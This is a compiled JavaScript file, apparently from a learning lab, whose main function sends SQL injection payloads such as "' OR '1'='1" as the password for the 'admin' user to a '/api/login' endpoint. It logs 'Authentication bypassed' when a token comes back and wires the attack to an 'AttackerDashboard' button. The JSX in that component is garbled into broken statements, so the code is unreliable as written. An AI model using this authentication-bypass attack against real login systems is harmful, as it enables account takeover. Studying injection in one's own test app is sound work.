"use strict";
// This function would live in your frontend code (e.g., a React component)
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
const injectSQL = (payload) => __awaiter(void 0, void 0, void 0, function* () {
    console.log(`[ATTACK] Sending SQL injection payload: "${payload}"`);
    // We'll target a known, valid username like 'admin'
    // which you should add to your 'users' table first.
    const targetUsername = 'admin';
    try {
        const response = yield fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            // We send the valid username, but the malicious payload as the password
            body: JSON.stringify({
                username: targetUsername,
                password: payload,
            }),
        });
        // Get the JSON response from the server
        const data = yield response.json();
        console.log('[RESPONSE] Server responded with:', data);
        // Check if the attack was successful
        // A successful attack will return a 200 OK status and a token
        if (response.ok && data.token) {
            console.log('%c[SUCCESS] Authentication bypassed! Token received!', 'color: #2ecc71; font-size: 14px; font-weight: bold;');
            // In a real scenario, you'd now be "logged in" as the admin
        }
        else {
            console.log(`%c[FAILURE] Injection did not work. Server message: ${data.message}`, 'color: #e74c3c; font-size: 14px;');
        }
    }
    catch (error) {
        console.error('An error occurred during the fetch request:', error);
    }
});
// --- HOW TO USE IT ---
// You could call this function from a button in your Next.js app's UI.
// For example, in a React component:
function AttackerDashboard() {
    const classicPayload = "' OR '1'='1";
    return Attacker;
    Control;
    Panel < /h2>
        < p > Click;
    the;
    button;
    to;
    attempt;
    a;
    classic;
    SQL;
    injection;
    attack. < /p>
        < button;
    onClick = {}();
    injectSQL(classicPayload);
}
 >
    Launch;
Attack
    < /button>
    < /div>;
;
